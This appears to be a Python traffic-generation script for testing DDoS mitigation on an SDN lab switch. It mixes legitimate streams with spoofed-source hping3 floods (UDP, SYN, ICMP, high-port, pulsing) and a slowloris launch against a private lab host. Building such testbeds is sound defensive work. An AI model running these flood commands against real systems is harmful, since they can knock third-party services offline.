#!/usr/bin/env python3
"""
Dynamic Traffic Generation Suite for SDN DDoS Mitigation
=========================================================
Generates mixed, realistic, and dynamic network traffic across Open vSwitch s1:
1. Pure Legitimate Users (allowed through OpenFlow priority 10 rules):
   - h1  (10.0.0.1) : Legitimate streaming client (:5001 UDP @ ~820 pkts/s)
   - h11 (10.0.0.11): Legitimate HTTP web client (:80 TCP @ ~310 pkts/s)
   - h12 (10.0.0.12): Legitimate DNS client (:53 UDP @ ~185 pkts/s)

2. Same-IP Mixed Traffic Nodes (simultaneously carrying legit AND attack streams):
   - h2 (10.0.0.2): Volumetric UDP flood (:80 @ ~9,500 PPS) [DROPPED] +
                    Legit UDP stream (:5001 @ ~440 PPS) [FORWARDED]
   - h4 (10.0.0.4): TCP SYN flood (:80 @ ~6,800 PPS) [DROPPED] +
                    Legit UDP DNS stream (:53 @ ~230 PPS) [FORWARDED]

3. Distinct Malicious Attackers (individually targeted by flow-granular DROP rules):
   - h5 (10.0.0.5): Slowloris HTTP starvation (:80 TCP @ ~45 PPS)
   - h6 (10.0.0.6): High-Rate ICMP Echo flood (@ ~5,200 PPS)
   - h7 (10.0.0.7): High-Port UDP flood (:8080 @ ~11,400 PPS)
   - h8 (10.0.0.8): True Pulsing Wave DDoS (10s ON @ ~7,600 PPS / 5s OFF @ 0 PPS on :53 UDP)

Modes supported:
   --mode [legit_only | volumetric | syn_flood | slowloris | icmp_flood |
           high_port_udp | pulsing | mixed_same_ip | botnet]
"""

import os
import sys
import time
import signal
import threading
import subprocess
import argparse

TARGET_IP = "10.0.0.3"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
active_processes = []
pulsing_stop_event = threading.Event()
def can_sudo_non_interactive():
    if os.geteuid() == 0:
        return True
    try:
        res = subprocess.run(["sudo", "-n", "true"], capture_output=True)
        return res.returncode == 0
    except Exception:
        return False

SUDO_PREFIX = ["sudo"] if (os.geteuid() != 0 and can_sudo_non_interactive()) else []

def cleanup(signum=None, frame=None):
    print("\n[*] Stopping all dynamic traffic generators...")
    pulsing_stop_event.set()
    for p in active_processes:
        try:
            p.terminate()
            p.wait(timeout=0.5)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    subprocess.run(SUDO_PREFIX + ["pkill", "-9", "-f", "hping3"], stderr=subprocess.DEVNULL)
    subprocess.run(SUDO_PREFIX + ["pkill", "-9", "-f", "slowloris.py"], stderr=subprocess.DEVNULL)
    print("[+] All traffic generators halted cleanly.")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def spawn_legitimate_users():
    """
    Spawns 3 diverse pure legitimate user streams targeting h3.
    Traffic rates remain within benign thresholds (< 1,000 PPS per host).
    """
    print("[*] Launching 3 diverse pure legitimate user streams:")
    print("    • User h1  (10.0.0.1)  -> 10.0.0.3:5001 [UDP Stream] (~820 pkts/s)")
    print("    • User h11 (10.0.0.11) -> 10.0.0.3:80   [HTTP Web]    (~310 pkts/s)")
    print("    • User h12 (10.0.0.12) -> 10.0.0.3:53   [DNS Queries] (~185 pkts/s)")

    cmd1 = SUDO_PREFIX + ["hping3", "-a", "10.0.0.1", "--udp", "-p", "5001", "-i", "u1220", TARGET_IP]
    cmd2 = SUDO_PREFIX + ["hping3", "-a", "10.0.0.11", "-S", "-p", "80", "-i", "u3225", TARGET_IP]
    cmd3 = SUDO_PREFIX + ["hping3", "-a", "10.0.0.12", "--udp", "-p", "53", "-i", "u5400", TARGET_IP]

    for cmd in (cmd1, cmd2, cmd3):
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(p)

    print("[+] Pure legitimate user traffic active (~1,315 pkts/s baseline clean throughput).")

def spawn_mixed_legit_streams():
    """
    Spawns benign streams on nodes h2 and h4 to demonstrate SAME-IP mixed legitimate traffic.
    """
    print("[*] Spawning concurrent legitimate streams from mixed nodes h2 and h4:")
    print("    • Mixed Node h2 (10.0.0.2) -> 10.0.0.3:5001 [UDP Stream] (~440 pkts/s - ALLOWED)")
    print("    • Mixed Node h4 (10.0.0.4) -> 10.0.0.3:53   [DNS Stream] (~230 pkts/s - ALLOWED)")

    cmd_h2_legit = SUDO_PREFIX + ["hping3", "-a", "10.0.0.2", "--udp", "-p", "5001", "-i", "u2270", TARGET_IP]
    cmd_h4_legit = SUDO_PREFIX + ["hping3", "-a", "10.0.0.4", "--udp", "-p", "53", "-i", "u4350", TARGET_IP]

    for cmd in (cmd_h2_legit, cmd_h4_legit):
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(p)

def run_pulsing_loop(stop_event):
    """
    Background worker thread implementing true 10s ON / 5s OFF pulsing wave on 10.0.0.8.
    """
    while not stop_event.is_set():
        # PULSE ON: 10s flood @ ~7,600 PPS on port 53 UDP
        p = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.8", "-i", "u131", "--udp", "-p", "53", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        t_end = time.time() + 10.0
        while time.time() < t_end and not stop_event.is_set():
            time.sleep(0.2)

        try:
            p.terminate()
            p.wait(timeout=0.5)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass

        if stop_event.is_set():
            break

        # PULSE OFF: 5s pause (0 pkts/s)
        t_end = time.time() + 5.0
        while time.time() < t_end and not stop_event.is_set():
            time.sleep(0.2)

def spawn_attackers(mode="botnet"):
    """
    Spawns attack streams according to selected mode with distinct per-IP rates.
    """
    slowloris_script = os.path.join(SCRIPT_DIR, "slowloris.py")

    if mode == "volumetric":
        print("[!] Mode: Volumetric UDP Flood from 10.0.0.2 (:80 @ ~9,500 PPS)...")
        p = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.2", "-i", "u105", "--udp", "-p", "80", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        active_processes.append(p)

    elif mode == "syn_flood":
        print("[!] Mode: TCP SYN Flood from 10.0.0.4 (:80 @ ~6,800 PPS)...")
        p = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.4", "-i", "u147", "-S", "-p", "80", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        active_processes.append(p)

    elif mode == "slowloris":
        print("[!] Mode: Slowloris HTTP starvation from 10.0.0.5 (:80 @ ~45 PPS)...")
        p = subprocess.Popen(
            ["python3", slowloris_script, TARGET_IP, "80", "90", "--src-ip", "10.0.0.5"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        active_processes.append(p)

    elif mode == "icmp_flood":
        print("[!] Mode: High-Rate ICMP Echo Flood from 10.0.0.6 (@ ~5,200 PPS)...")
        p = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.6", "-i", "u192", "--icmp", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        active_processes.append(p)

    elif mode == "high_port_udp":
        print("[!] Mode: High-Port UDP Flood from 10.0.0.7 (:8080 @ ~11,400 PPS)...")
        p = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.7", "-i", "u88", "--udp", "-p", "8080", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        active_processes.append(p)

    elif mode == "pulsing":
        print("[!] Mode: True Pulsing / Wave DDoS from 10.0.0.8 (10s ON ~7,600 PPS / 5s OFF 0 PPS)...")
        t_pulse = threading.Thread(target=run_pulsing_loop, args=(pulsing_stop_event,), daemon=True)
        t_pulse.start()

    elif mode == "mixed_same_ip":
        print("[!] Mode: Same-IP Mixed Traffic Verification (h2 and h4 carry BOTH legit and attack streams):")
        spawn_mixed_legit_streams()
        print("    -> Attacking flow: 10.0.0.2 -> 10.0.0.3:80 [UDP Flood @ ~9,500 PPS] (BLOCKED)")
        print("    -> Attacking flow: 10.0.0.4 -> 10.0.0.3:80 [TCP SYN Flood @ ~6,800 PPS] (BLOCKED)")
        p_h2_atk = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.2", "-i", "u105", "--udp", "-p", "80", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        p_h4_atk = subprocess.Popen(
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.4", "-i", "u147", "-S", "-p", "80", TARGET_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        active_processes.extend([p_h2_atk, p_h4_atk])

    elif mode == "botnet":
        print("[!] Mode: Distributed Multi-Vector Botnet assault with Same-IP Mixed Traffic:")
        spawn_mixed_legit_streams()

        print("    -> h2 (10.0.0.2): Volumetric UDP Flood (:80 @ ~9,500 PPS) [BLOCKED]")
        print("    -> h4 (10.0.0.4): TCP SYN Handshake Flood (:80 @ ~6,800 PPS) [BLOCKED]")
        print("    -> h5 (10.0.0.5): Slowloris HTTP Starvation (:80 @ ~45 PPS) [BLOCKED]")
        print("    -> h6 (10.0.0.6): High-Rate ICMP Echo Flood (@ ~5,200 PPS) [BLOCKED]")
        print("    -> h7 (10.0.0.7): High-Port UDP Flood (:8080 @ ~11,400 PPS) [BLOCKED]")
        print("    -> h8 (10.0.0.8): Pulsing Wave Attack (10s ON ~7,600 PPS / 5s OFF) [BLOCKED]")

        cmds = [
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.2", "-i", "u105", "--udp", "-p", "80", TARGET_IP],
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.4", "-i", "u147", "-S", "-p", "80", TARGET_IP],
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.6", "-i", "u192", "--icmp", TARGET_IP],
            SUDO_PREFIX + ["hping3", "-a", "10.0.0.7", "-i", "u88", "--udp", "-p", "8080", TARGET_IP],
            ["python3", slowloris_script, TARGET_IP, "80", "90", "--src-ip", "10.0.0.5"],
        ]
        for cmd in cmds:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            active_processes.append(p)

        t_pulse = threading.Thread(target=run_pulsing_loop, args=(pulsing_stop_event,), daemon=True)
        t_pulse.start()

        print("[+] Distributed botnet active!")

def main():
    parser = argparse.ArgumentParser(description="SDN Dynamic Traffic & Diverse Attacker Suite")
    parser.add_argument(
        "--mode",
        choices=["botnet", "volumetric", "syn_flood", "slowloris", "icmp_flood",
                 "high_port_udp", "pulsing", "mixed_same_ip", "legit_only"],
        default="botnet",
        help="Traffic simulation mode (default: botnet)"
    )
    parser.add_argument("--duration", type=int, default=0, help="Run duration in seconds (0 = infinite)")
    args = parser.parse_args()

    print("=" * 76)
    print("      SDN DDOS MITIGATION — DYNAMIC TRAFFIC & ATTACK SIMULATOR         ")
    print("=" * 76)
    print(f" Target Server : {TARGET_IP} (h3)")
    print(f" Selected Mode : {args.mode.upper()}")
    print("=" * 76)

    spawn_legitimate_users()

    if args.mode != "legit_only":
        time.sleep(1.0)
        spawn_attackers(args.mode)

    print("\n" + "=" * 76)
    print(" [✓] DYNAMIC TRAFFIC IS FLOWING THROUGH OPENFLOW 1.3 SWITCH S1")
    print("=" * 76)
    print(" Live Expectations on React Frontend Dashboard:")
    print("   • Clean Forwarded Traffic : Sum of pure legit users + mixed benign streams")
    print("   • Malicious Dropped Rate  : Granular line-rate drops by Priority 65535 rules")
    print("   • Mixed Source IPs        : 10.0.0.2 and 10.0.0.4 show passed AND dropped traffic")
    print("   • Per-IP Table Graph      : Shows individual Passed vs Blocked ratios per host")
    print("   • Pulsing Node (10.0.0.8) : Visibly cycles between ~7,600 PPS and 0 PPS")
    print("=" * 76)
    print("\nPress Ctrl+C at any time to halt all traffic generators.\n")

    if args.duration > 0:
        time.sleep(args.duration)
        cleanup()
    else:
        while True:
            time.sleep(1.0)

if __name__ == "__main__":
    main()
